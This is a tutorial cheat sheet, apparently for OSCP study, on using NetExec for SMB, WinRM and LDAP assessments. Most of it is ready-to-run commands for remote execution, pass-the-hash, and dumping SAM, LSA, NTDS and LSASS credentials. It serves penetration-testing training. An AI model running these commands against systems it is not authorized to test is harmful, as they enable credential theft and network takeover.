# NetExec - Swiss Army Knife for Network Authentication Testing

NetExec (`nxc`) is the maintained fork of CrackMapExec. Most people associate it with Active Directory, but it is equally useful on non-AD assessments - any time you hit SMB or WinRM, NetExec belongs in your workflow.

## Why NetExec

The core value is speed and consistency. Instead of juggling multiple tools for credential validation, share enumeration, and post-exploitation, NetExec handles all of it through a single interface across SMB, WinRM, LDAP, RDP, and SSH. On OSCP, time and mental overhead are your real constraints - having one tool that does everything means fewer context switches and fewer mistakes.

## SMB

### Credential Validation

Check if credentials are valid and whether the account has local admin rights:

```bash
nxc smb 10.10.10.10 -u user -p password
```

`[+]` means valid credentials. `(Pwned!)` means local admin rights on that machine.

### Share Enumeration

Test anonymous access:

```bash
nxc smb 10.10.10.10 -u '' -p ''
```

Test guest access:

```bash
nxc smb 10.10.10.10 -u guest -p ''
```

List shares with valid credentials:

```bash
nxc smb 10.10.10.10 -u user -p password --shares
```

### User Enumeration

Enumerate users anonymously - also check the `description` field, it sometimes contains forgotten passwords:

```bash
nxc smb 10.10.10.10 -u '' -p '' --users
```

Enumerate users with valid credentials:

```bash
nxc smb 10.10.10.10 -u user -p password --users
```

RID brute-force to resolve account names - works without credentials if guest auth is enabled:

```bash
nxc smb 10.10.10.10 -u '' -p '' --rid-brute
```

### Remote Command Execution

Requires local admin. Use `-x` for cmd.exe, `-X` for PowerShell:

```bash
nxc smb 10.10.10.10 -u user -p password -x whoami
```

```bash
nxc smb 10.10.10.10 -u user -p password -X whoami
```

### Credential and Hash Dumping

Once you have local admin rights, NetExec handles remote dumps without touching disk - no Mimikatz upload required.

Dump SAM - local account hashes:

```bash
nxc smb 10.10.10.10 -u user -p password --sam
```

Dump LSA secrets - service accounts and cached domain credentials:

```bash
nxc smb 10.10.10.10 -u user -p password --lsa
```

Dump NTDS.dit - all domain account hashes, DC only:

```bash
nxc smb 10.10.10.10 -u user -p password --ntds
```

In-memory dump via lsassy - no binary touches disk:

```bash
nxc smb 10.10.10.10 -u user -p password -M lsassy
```

Alternative in-memory dump when lsassy is blocked:

```bash
nxc smb 10.10.10.10 -u user -p password -M nanodump
```

Check who is currently logged in:

```bash
nxc smb 10.10.10.10 -u user -p password --loggedon-users
```

`--sam` and `--lsa` are fastest. On OSCP use `--sam` first - immediate local hashes for pass-the-hash or cracking.

### Pass the Hash

All commands accept an NT hash instead of a password:

```bash
nxc smb 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

## WinRM

Check if credentials work over WinRM:

```bash
nxc winrm 10.10.10.10 -u user -p password
```

`(Pwned!)` means WinRM access confirmed - use Evil-WinRM to get a shell. Execute a command directly:

```bash
nxc winrm 10.10.10.10 -u user -p password -x whoami
```

## LDAP

Anonymous bind - leaks users, groups, and password policy without credentials:

```bash
nxc ldap 10.10.10.10 -u '' -p ''
```

Enumerate users with valid credentials:

```bash
nxc ldap 10.10.10.10 -u user -p password --users
```

Collect BloodHound data without uploading SharpHound to the target:

```bash
nxc ldap 10.10.10.10 -u user -p password --bloodhound --collection All
```

## Known Limitations

NetExec is not reliable for every protocol. Two services where it consistently causes problems:

**RDP** - NXC will sometimes report `(Pwned!)` or a successful login on RDP when the credentials do not actually work. Do not trust NXC for RDP access confirmation - verify manually with `xfreerdp` or `rdesktop`.

**MSSQL** - NXC's MSSQL module has connection issues depending on the target configuration. Authentication may fail or behave unexpectedly even with valid credentials. Use `impacket-mssqlclient` instead - it is more reliable and gives you a proper interactive session:

```bash
impacket-mssqlclient user:password@10.10.10.10
```

```bash
impacket-mssqlclient -windows-auth user:password@10.10.10.10
```

This is why in [nxcprobe](https://github.com/danildudchenko/nxcprobe) - a script that tests credentials across multiple services automatically - MSSQL validation is handled by impacket rather than NXC to avoid false negatives.

## Quick Reference

| Protocol | Use Case | Command |
|----------|----------|---------|
| SMB | Check local admin | <code>nxc smb IP -u user -p pass</code> |
| SMB | Anonymous access | <code>nxc smb IP -u '' -p ''</code> |
| SMB | List shares | <code>nxc smb IP -u user -p pass --shares</code> |
| SMB | Enumerate users | <code>nxc smb IP -u user -p pass --users</code> |
| SMB | RID brute | <code>nxc smb IP -u '' -p '' --rid-brute</code> |
| SMB | Dump SAM | <code>nxc smb IP -u user -p pass --sam</code> |
| SMB | Dump LSA | <code>nxc smb IP -u user -p pass --lsa</code> |
| SMB | In-memory dump | <code>nxc smb IP -u user -p pass -M lsassy</code> |
| SMB | All domain hashes | <code>nxc smb IP -u user -p pass --ntds</code> |
| SMB | Execute command | <code>nxc smb IP -u user -p pass -x cmd</code> |
| WinRM | Check access | <code>nxc winrm IP -u user -p pass</code> |
| LDAP | Anonymous bind | <code>nxc ldap IP -u '' -p ''</code> |
| LDAP | BloodHound | <code>nxc ldap IP -u user -p pass --bloodhound --collection All</code> |
